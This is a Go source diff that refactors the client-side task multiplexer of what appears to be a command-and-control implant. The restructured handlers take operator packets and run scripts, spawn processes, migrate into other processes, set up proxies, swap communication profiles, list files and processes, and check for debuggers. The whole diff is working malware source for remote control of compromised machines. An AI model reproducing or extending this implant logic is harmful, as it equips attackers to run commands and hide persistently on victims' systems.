@@ -35,37 +35,102 @@ var (
 	_ runnable = (*cmd.Assembly)(nil)
 )
 
-func wrapScript(s *Session, n *com.Packet) {
-	var (
-		r   = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
-		err = runScript(s, n, r)
-	)
-	if n.Clear(); err != nil {
-		if r.Clear(); cout.Enabled {
-			s.log.Error("[%s/MuX/ScR] Error during Job %d runtime: %s!", s.ID, n.Job, err)
-		}
-		r.Flags |= com.FlagError
-		r.WriteString(err.Error())
+var errNoTask = xerr.Sub(fourOhFour, 0xFE)
+
+func muxHandleSpawnAsync(s *Session, n *com.Packet) {
+	if bugtrack.Enabled {
+		defer bugtrack.Recover("c2.muxHandleSpawnAsync()")
 	}
-	if err = s.write(false, r); err != nil {
-		if r.Clear(); cout.Enabled {
-			s.log.Error("[%s/Mux/ScR] Received error sending Task results: %s!", s.ID, err)
-		}
-	}
+	w := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
+	muxHandleSend(s, n, w, muxHandleSpawnSync(s, n, w))
+	w = nil
 }
-func runScript(s *Session, n, w *com.Packet) error {
-	y, err := n.Uint8()
+func muxHandleScriptAsync(s *Session, n *com.Packet) {
+	if bugtrack.Enabled {
+		defer bugtrack.Recover("c2.muxHandleScriptAsync()")
+	}
+	w := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
+	muxHandleSend(s, n, w, muxHandleScript(s, n, w))
+	w = nil
+}
+func defaultClientMux(s *Session, n *com.Packet) bool {
+	if n.ID < task.MvRefresh || n.ID == RvResult || n.ID == RvMigrate {
+		return false
+	}
+	if cout.Enabled {
+		s.log.Info("[%s/MuX] Received packet %q.", s.ID, n)
+	}
+	switch {
+	case n.ID == task.MvSpawn:
+		go muxHandleSpawnAsync(s, n)
+		return true
+	case n.ID == task.MvScript:
+		go muxHandleScriptAsync(s, n)
+		return true
+	case n.ID > RvResult:
+		go muxHandleExternalAsync(s, n)
+		return true
+	}
+	var (
+		w   = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
+		err = muxHandleInternal(s, n, w)
+	)
+	if err == nil && n.ID == task.MvMigrate {
+		if w = nil; cout.Enabled {
+			s.log.Info("[%s/Mux] Migrate Job %d passed, not sending response back!", s.ID, n.Job)
+		}
+		return true
+	}
+	muxHandleSend(s, n, w, err)
+	w = nil
+	return true
+}
+func muxHandleExternalAsync(s *Session, n *com.Packet) {
+	if bugtrack.Enabled {
+		defer bugtrack.Recover("c2.muxHandleExternalAsync()")
+	}
+	var (
+		w = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
+		t = task.Mappings[n.ID]
+	)
+	if t == nil {
+		if w.WriteString(fourOhFour); cout.Enabled {
+			s.log.Warning("[%s/MuX] Received Packet ID 0x%X with no Task mapping!", s.ID, n.ID)
+		}
+		w.Flags |= com.FlagError
+		muxHandleSend(s, n, w, nil)
+		return
+	}
+	if n.ID == task.TvWait {
+		if cout.Enabled {
+			s.log.Warning("[%s/MuX] Skipping non-Script WAIT Task!", s.ID)
+		}
+		muxHandleSend(s, n, w, nil)
+		return
+	}
+	if cout.Enabled {
+		s.log.Info("[%s/MuX] Starting async Task for Job %d.", s.ID, n.Job)
+	}
+	muxHandleSend(s, n, w, t(s.ctx, n, w))
+	t = nil
+}
+func muxHandleScript(s *Session, n, w *com.Packet) error {
+	if cout.Enabled {
+		s.log.Info("[%s/MuX] Starting Script Task for Job %d.", s.ID, n.Job)
+	}
+	o, err := n.Uint8()
 	if err != nil {
 		return err
 	}
 	var (
 		b = buffers.Get().(*data.Chunk)
-		e = y&flagStopOnError != 0
-		o = y&flagNoReturnOutput == 0
+		e = o&flagStopOnError != 0
+		r = o&flagNoReturnOutput == 0
 		d []byte
-		k bool
 		v com.Packet
+		t task.Tasker
 	)
+loop:
 	for err = nil; err == nil; b.Reset() {
 		v.Reset()
 		if err = n.ReadUint8(&v.ID); err != nil {
@@ -76,38 +141,46 @@ func runScript(s *Session, n, w *com.Packet) error {
 		}
 		v.Grow(len(d))
 		v.Write(d)
-		d, err = nil, nil
 		w.WriteUint8(v.ID)
-		if k, err = internalTask(s, &v, b); !k {
-			t := task.Mappings[v.ID]
-			if t == nil {
-				if cout.Enabled {
-					s.log.Warning("[%s/MuX/ScR] Received Packet ID 0x%X with no Task mapping!", s.ID, n.ID)
-				}
+		switch d, err = nil, nil; {
+		case v.ID == task.MvScript:
+			if e {
+				err = syscall.EINVAL
+				break loop
+			}
+			w.WriteBool(false)
+			w.WriteString(syscall.EINVAL.Error())
+			continue loop
+		case v.ID == task.MvSpawn:
+			err = muxHandleSpawnSync(s, &v, b)
+		case v.ID < RvResult:
+			err = muxHandleInternal(s, &v, b)
+		default:
+			if t = task.Mappings[v.ID]; t == nil {
 				if e {
-					// Set this so we set an error and return something.
-					err = os.ErrNotExist
-					break
+					err = errNoTask
+					break loop
 				}
 				w.WriteBool(false)
 				w.WriteString(fourOhFour)
-				continue
+				continue loop
 			}
 			err = t(s.ctx, &v, b)
 		}
 		if err != nil {
-			if e {
-				break
+			if !e {
+				w.WriteBool(false)
+				w.WriteString(err.Error())
+				err = nil
+				continue loop
 			}
-			w.WriteBool(false)
-			w.WriteString(err.Error())
-			continue
+			break loop
 		}
-		if w.WriteBool(true); o && b.Size() > 0 {
+		if w.WriteBool(true); r && b.Size() > 0 {
 			w.WriteBytes(b.Payload())
-		} else {
-			w.WriteUint8(0)
+			continue loop
 		}
+		w.WriteInt8(0)
 	}
 	b.Clear()
 	v.Clear()
@@ -117,113 +190,39 @@ func runScript(s *Session, n, w *com.Packet) error {
 	}
 	return err
 }
-func defaultClientMux(s *Session, n *com.Packet) bool {
-	if n.ID < task.MvRefresh {
-		return false
-	}
-	if cout.Enabled {
-		s.log.Info("[%s/MuX] Received packet %q.", s.ID, n)
-	}
-	if n.ID == task.MvScript {
-		go wrapScript(s, n)
-		return true
-	}
-	if n.ID < RvResult {
-		if n.ID == task.MvSpawn {
-			go executeTask(s.handleSpawn, s, n)
-			return true
+func muxHandleSend(s *Session, n, w *com.Packet, e error) {
+	if e != nil {
+		w.Clear()
+		w.Flags |= com.FlagError
+		if w.WriteString(e.Error()); cout.Enabled {
+			s.log.Error("[%s/MuX] Error during Job %d runtime: %s!", s.ID, n.Job, e.Error())
 		}
-		var (
-			r      = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
-			v, err = internalTask(s, n, r)
-		)
-		if v {
-			if n.Clear(); err == nil && n.ID == task.MvMigrate {
-				if cout.Enabled {
-					s.log.Info("[%s/Mux] Migrate Job %d returned true, not sending response back!", s.ID, n.Job)
-				}
-				return true
-			}
-			if err != nil {
-				if r.Clear(); cout.Enabled {
-					s.log.Error("[%s/MuX] Error during Job %d runtime: %s!", s.ID, n.Job, err)
-				}
-				r.Flags |= com.FlagError
-				r.WriteString(err.Error())
-			} else if cout.Enabled {
-				s.log.Debug("[%s/MuX] Task with JobID %d completed!", s.ID, n.Job)
-			}
-			// NOTE(dij): We block here since most of these are critical.
-			s.write(true, r)
-			return true
-		}
-		r.Clear()
-		r = nil
-	}
-	if n.ID == task.TvWait {
-		if cout.Enabled {
-			s.log.Warning("[%s/MuX] Skipping non-Script WAIT Task!", s.ID)
-		}
-		s.write(true, &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID})
-		return true
-	}
-	if t := task.Mappings[n.ID]; t != nil {
-		go executeTask(t, s, n)
-		return true
-	}
-	if cout.Enabled {
-		s.log.Warning("[%s/MuX] Received Packet ID 0x%X with no Task mapping!", s.ID, n.ID)
-	}
-	r := &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID, Flags: com.FlagError}
-	r.WriteString(fourOhFour)
-	s.write(true, r)
-	return false
-}
-func executeTask(t task.Tasker, s *Session, n *com.Packet) {
-	if bugtrack.Enabled {
-		defer bugtrack.Recover("c2.executeTask()")
-	}
-	if cout.Enabled {
-		s.log.Info("[%s/TasK] Starting Task with JobID %d.", s.ID, n.Job)
-	}
-	var (
-		r   = &com.Packet{ID: RvResult, Job: n.Job, Device: s.ID}
-		err = t(s.ctx, n, r)
-	)
-	if n.Clear(); err != nil {
-		if r.Clear(); cout.Enabled {
-			s.log.Error("[%s/TasK] Received error during JobID %d Task runtime: %s!", s.ID, n.Job, err)
-		}
-		r.Flags |= com.FlagError
-		r.WriteString(err.Error())
 	} else if cout.Enabled {
-		s.log.Debug("[%s/TasK] Task with JobID %d completed!", s.ID, n.Job)
+		s.log.Debug("[%s/MuX] Task with Job %d completed!", s.ID, n.Job)
 	}
-	if err = s.write(false, r); err != nil {
-		if r.Clear(); cout.Enabled {
-			s.log.Error("[%s/TasK] Received error sending Task results: %s!", s.ID, err)
-		}
-	}
+	// NOTE(dij): For now, we're gonna let these block.
+	//            I'll tack and see if they should throw errors instead.
+	s.write(true, w)
 }
-func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
+func muxHandleInternal(s *Session, n *com.Packet, w data.Writer) error {
 	switch n.ID {
 	case task.MvPwd:
 		d, err := syscall.Getwd()
 		if err != nil {
-			return true, err
+			return err
 		}
 		w.WriteString(d)
-		return true, nil
+		return nil
 	case task.MvCwd:
 		d, err := n.StringVal()
 		if err != nil {
-			return true, err
+			return err
 		}
-		return true, syscall.Chdir(device.Expand(d))
+		return syscall.Chdir(device.Expand(d))
 	case task.MvList:
 		d, err := n.StringVal()
 		if err != nil {
-			return true, err
+			return err
 		}
 		if len(d) == 0 {
 			d = "."
@@ -232,7 +231,7 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 		}
 		s, err := os.Stat(d)
 		if err != nil {
-			return true, err
+			return err
 		}
 		if !s.IsDir() {
 			w.WriteUint32(1)
@@ -240,11 +239,11 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 			w.WriteInt32(int32(s.Mode()))
 			w.WriteInt64(s.Size())
 			w.WriteInt64(s.ModTime().Unix())
-			return true, nil
+			return nil
 		}
 		var l []fs.DirEntry
 		if l, err = os.ReadDir(d); err != nil {
-			return true, err
+			return err
 		}
 		w.WriteUint32(uint32(len(l)))
 		for i, m := uint32(0), uint32(len(l)); i < m; i++ {
@@ -259,15 +258,15 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 			w.WriteInt64(0)
 			w.WriteInt64(0)
 		}
-		return true, nil
+		return nil
 	case task.MvTime:
 		j, err := n.Int8()
 		if err != nil {
-			return true, err
+			return err
 		}
 		d, err := n.Int64()
 		if err != nil {
-			return true, err
+			return err
 		}
 		switch {
 		case j == -1:
@@ -289,57 +288,56 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 		}
 		w.WriteUint8(s.jitter)
 		w.WriteUint64(uint64(s.sleep))
-		return true, nil
+		return nil
 	case task.MvProxy:
 		var (
 			v string
 			r uint8
 		)
 		if err := n.ReadString(&v); err != nil {
-			return true, err
+			return err
 		}
 		if err := n.ReadUint8(&r); err != nil {
-			return true, err
+			return err
 		}
 		if r == 0 {
 			if i := s.Proxy(v); i != nil {
-				return true, i.Close()
+				return i.Close()
 			}
-			return true, os.ErrNotExist
+			return os.ErrNotExist
 		}
 		if ProfileParser == nil {
-			return true, xerr.Sub("no Profile parser loaded", 0x44)
+			return xerr.Sub("no Profile parser loaded", 0x44)
 		}
 		var (
 			b string
 			k []byte
 		)
 		if err := n.ReadString(&b); err != nil {
-			return true, err
+			return err
 		}
 		if err := n.ReadBytes(&k); err != nil {
-			return true, err
+			return err
 		}
 		p, err := ProfileParser(k)
 		if err != nil {
-			return true, xerr.Wrap("parse Profile", err)
+			return xerr.Wrap("parse Profile", err)
 		}
 		if r == 1 {
-			i := s.Proxy(v)
-			if i == nil {
-				return true, os.ErrNotExist
+			if i := s.Proxy(v); i != nil {
+				return i.Replace(b, p)
 			}
-			return true, i.Replace(b, p)
+			return os.ErrNotExist
 		}
 		_, err = s.NewProxy(v, b, p)
-		return true, err
+		return err
 	case task.MvMounts:
 		m, err := device.Mounts()
 		if err != nil {
-			return true, err
+			return err
 		}
 		data.WriteStringList(w, m)
-		return true, nil
+		return nil
 	case task.MvMigrate:
 		var (
 			k bool
@@ -347,74 +345,103 @@ func internalTask(s *Session, n *com.Packet, w data.Writer) (bool, error) {
 			p []byte
 		)
 		if err := n.ReadBool(&k); err != nil {
-			return true, err
+			return err
 		}
 		if err := n.ReadString(&i); err != nil {
-			return true, err
+			return err
 		}
 		if err := n.ReadBytes(&p); err != nil {
-			return true, err
+			return err
 		}
 		e, v, err := readCallable(s.ctx, true, n)
 		if err != nil {
-			return true, err
+			return err
 		}
 		if _, err = s.MigrateProfile(k, i, p, n.Job, 0, e); err != nil {
 			if len(v) > 0 {
 				os.Remove(v)
 			}
-			return true, err
+			return err
 		}
-		return true, nil
+		return nil
 	case task.MvRefresh:
 		if cout.Enabled {
 			s.log.Debug("[%s] Triggering a device refresh.", s.ID)
 		}
 		if err := local.Device.Refresh(); err != nil {
-			return true, err
+			return err
 		}
 		s.Device = *local.Device.Machine
 		s.Device.MarshalStream(w)
-		return true, nil
+		return nil
 	case task.MvProfile:
 		if ProfileParser == nil {
-			return true, xerr.Sub("no Profile parser loaded", 0x44)
+			return xerr.Sub("no Profile parser loaded", 0x44)
 		}
 		b, err := n.Bytes()
 		if err != nil {
-			return true, err
+			return err
 		}
 		p, err := ProfileParser(b)
 		if err != nil {
-			return true, xerr.Wrap("parse Profile", err)
+			return xerr.Wrap("parse Profile", err)
 		}
-		if cout.Enabled {
+		if s.swap = p; cout.Enabled {
 			s.log.Info("[%s] Setting new profile, switch will happen on next connect cycle.", s.ID)
 		}
-		s.swap = p
-		return true, nil
+		return nil
 	case task.MvProcList:
 		e, err := cmd.Processes()
 		if err != nil {
-			return true, err
+			return err
 		}
 		if err = w.WriteUint32(uint32(len(e))); err != nil {
-			return true, err
+			return err
 		}
 		if len(e) == 0 {
-			return true, nil
+			return nil
 		}
 		for i, m := uint32(0), uint32(len(e)); i < m; i++ {
 			if err = e[i].MarshalStream(w); err != nil {
-				return true, err
+				return err
 			}
 		}
-		return true, nil
+		return nil
 	case task.MvCheckDebug:
 		w.WriteBool(device.IsDebugged())
-		return true, nil
+		return nil
 	}
-	return false, nil
+	// Shouldn't happen
+	return errNoTask
+}
+func muxHandleSpawnSync(s *Session, n *com.Packet, w data.Writer) error {
+	if cout.Enabled {
+		s.log.Info("[%s/MuX] Starting Spawn Task for Job %d.", s.ID, n.Job)
+	}
+	var (
+		i   string
+		p   []byte
+		err = n.ReadString(&i)
+	)
+	if err != nil {
+		return err
+	}
+	if err = n.ReadBytes(&p); err != nil {
+		return err
+	}
+	e, v, err := readCallable(s.ctx, false, n)
+	if err != nil {
+		return err
+	}
+	var c uint32
+	if c, err = s.SpawnProfile(i, p, 0, e); err != nil {
+		if len(v) > 0 {
+			os.Remove(v)
+		}
+		return err
+	}
+	w.WriteUint32(c)
+	return nil
 }
 func readCallable(x context.Context, m bool, r data.Reader) (cmd.Runnable, string, error) {
 	var (
@@ -509,29 +536,4 @@ func readCallable(x context.Context, m bool, r data.Reader) (cmd.Runnable, strin
 		}
 	}
 	return e, v, nil
-}
-func (s *Session) handleSpawn(x context.Context, r data.Reader, w data.Writer) error {
-	var (
-		i string
-		p []byte
-	)
-	if err := r.ReadString(&i); err != nil {
-		return err
-	}
-	if err := r.ReadBytes(&p); err != nil {
-		return err
-	}
-	e, v, err := readCallable(s.ctx, false, r)
-	if err != nil {
-		return err
-	}
-	var c uint32
-	if c, err = s.SpawnProfile(i, p, 0, e); err != nil {
-		if len(v) > 0 {
-			os.Remove(v)
-		}
-		return err
-	}
-	w.WriteUint32(c)
-	return nil
 }
